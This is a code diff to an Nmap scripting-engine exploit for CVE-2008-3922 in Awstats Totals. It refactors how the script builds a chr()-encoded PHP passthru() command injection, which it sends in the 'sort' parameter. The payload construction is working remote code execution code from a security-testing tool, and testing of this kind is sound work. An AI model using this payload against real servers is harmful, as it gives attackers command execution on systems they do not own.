@@ -4,6 +4,7 @@ local nmap = require "nmap"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
+local table = require "table"
 
 description = [[
 Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it (CVE: 2008-3922).
@@ -99,12 +100,9 @@ action = function(host, port)
   end
 
   --Encode payload using PHP's chr()
-  local encoded_payload = ""
-  cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
-  if string.sub(encoded_payload, #encoded_payload) == "." then
-    encoded_payload = string.sub(encoded_payload, 1, #encoded_payload-1)
-  end
-  local stealth_payload = "?sort={%24{passthru%28"..encoded_payload.."%29}}{%24{exit%28%29}}"
+  local encoded_payload = {}
+  cmd:gsub(".", function(c) encoded_payload[#encoded_payload+1] = ("chr(%s)"):format(string.byte(c)) end)
+  local stealth_payload = "?sort={%24{passthru%28"..table.concat(encoded_payload,'.').."%29}}{%24{exit%28%29}}"
 
   --set payload and send request
   local req = http.get(host, port, uri .. stealth_payload)
